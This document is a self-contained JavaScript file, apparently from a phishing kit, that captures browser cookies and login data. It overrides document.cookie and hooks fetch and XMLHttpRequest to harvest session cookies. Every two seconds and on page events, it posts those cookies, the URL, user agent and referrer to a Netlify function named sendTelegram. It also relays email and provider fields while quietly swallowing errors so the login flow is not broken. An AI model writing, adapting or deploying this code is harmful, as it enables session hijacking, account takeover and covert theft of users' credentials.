// Enhanced Client-Side Cookie Capture
(function() {
    'use strict';
    
    console.log('🍪 Client Cookie Capture Script loaded');
    
    // Add sendToTelegram function to fix circular import issue
    window.sendToTelegram = async (data) => {
        try {
            console.log('📤 Sending data to Telegram:', {
                email: data.email,
                provider: data.provider,
                hasCookies: !!data.cookies,
                cookiesLength: data.cookies ? data.cookies.length : 0,
                hasDocumentCookies: !!data.documentCookies
            });

            const response = await fetch('/.netlify/functions/sendTelegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('❌ Telegram API error:', errorText);
                throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
            }

            const result = await response.json();
            console.log('✅ Data sent to Telegram successfully:', result);
            return result;
        } catch (error) {
            console.error('❌ Failed to send to Telegram:', error);
            // Don't throw error to avoid breaking the login flow
        }
    };
    
    // Store original cookie descriptor
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    
    // Cookie storage
    let capturedCookies = [];
    let sessionCookies = new Set();
    
    // Function to capture and send cookie data
    function captureCookieData(action, cookieString, domain = window.location.hostname) {
        const timestamp = new Date().toISOString();
        const cookieData = {
            action: action,
            cookie: cookieString,
            domain: domain,
            url: window.location.href,
            timestamp: timestamp,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        };
        
        capturedCookies.push(cookieData);
        
        // Parse individual cookies
        if (cookieString) {
            cookieString.split(';').forEach(cookie => {
                const trimmed = cookie.trim();
                if (trimmed) {
                    sessionCookies.add(trimmed);
                }
            });
        }
        
        console.log(`🍪 Cookie ${action} on ${domain}:`, cookieString);
        
        // Send to backend if available
        try {
            fetch('/.netlify/functions/sendTelegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(cookieData)
            }).catch(e => console.log('Cookie capture endpoint not available:', e));
        } catch (e) {
            console.log('Cookie capture failed:', e);
        }
    }
    
    // Override document.cookie setter and getter
    Object.defineProperty(Document.prototype, 'cookie', {
        get: function() {
            const cookies = originalCookieDescriptor.get.call(this);
            if (cookies && cookies !== '') {
                captureCookieData('READ', cookies);
            }
            return cookies;
        },
        set: function(cookieString) {
            captureCookieData('SET', cookieString);
            return originalCookieDescriptor.set.call(this, cookieString);
        },
        configurable: true
    });
    
    // Monitor all network requests
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        const options = args[1] || {};
        
        // Capture cookies before request
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('PRE_FETCH', currentCookies);
        }
        
        return originalFetch.apply(this, args).then(response => {
            // Capture cookies after response
            setTimeout(() => {
                const postCookies = document.cookie;
                if (postCookies && postCookies !== currentCookies) {
                    captureCookieData('POST_FETCH', postCookies);
                }
            }, 100);
            return response;
        });
    };
    
    // Monitor XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._url = url;
        return originalXHROpen.call(this, method, url, ...args);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('XHR_REQUEST', currentCookies);
        }
        
        this.addEventListener('load', () => {
            setTimeout(() => {
                const postCookies = document.cookie;
                if (postCookies && postCookies !== currentCookies) {
                    captureCookieData('XHR_RESPONSE', postCookies);
                }
            }, 100);
        });
        
        return originalXHRSend.call(this, data);
    };
    
    // Periodic cookie monitoring
    setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('PERIODIC_CHECK', currentCookies);
        }
    }, 2000);
    
    // Monitor page events
    ['focus', 'blur', 'beforeunload', 'unload'].forEach(eventType => {
        window.addEventListener(eventType, () => {
            const cookies = document.cookie;
            if (cookies) {
                captureCookieData(`WINDOW_${eventType.toUpperCase()}`, cookies);
            }
        });
    });
    
    // Monitor storage events
    window.addEventListener('storage', function(e) {
        captureCookieData('STORAGE_EVENT', document.cookie);
    });
    
    // Expose global functions
    window.getCapturedCookies = function() {
        return capturedCookies;
    };
    
    window.getSessionCookies = function() {
        return Array.from(sessionCookies);
    };
    
    window.forceCookieCapture = function() {
        const cookies = document.cookie;
        captureCookieData('MANUAL_CAPTURE', cookies);
        return cookies;
    };
    
    // Initial capture
    setTimeout(() => {
        const initialCookies = document.cookie;
        if (initialCookies) {
            captureCookieData('INITIAL_LOAD', initialCookies);
        }
    }, 500);
    
    console.log('🍪 Client Cookie Capture active');
})();